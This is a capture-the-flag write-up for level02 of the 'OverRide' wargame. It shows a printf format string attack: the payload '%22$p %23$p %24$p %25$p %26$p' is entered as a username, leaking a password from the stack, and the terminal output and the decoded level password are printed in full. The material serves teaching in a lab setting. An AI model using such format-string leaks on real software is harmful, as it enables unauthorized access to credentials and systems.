Here, with a little reverse engineering, we understand that in order to get to the systemcall to /bin/sh in the program, we need to input the password that we do not have since it is the one we are looking for. There is unfortunately no (or at least not any that we could find) easy exploit before that so we understand that this system call is a bait. Fortunately we have a very bad use of printf at the end, vulnerable to a format string attack. With gdb we can find that the password is stored in the stack at address $esp+22 to $esp+26 so 22nd to 26th element of the stack. We can just print these values with the format string like so :

`%22$p %23$p %24$p %25$p %26$p`

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: 
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

And there is the password, we do a little magic with this and [our super exploit](./Ressources/exploit.py) and we get the password :

```bash
python exploit.py 
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
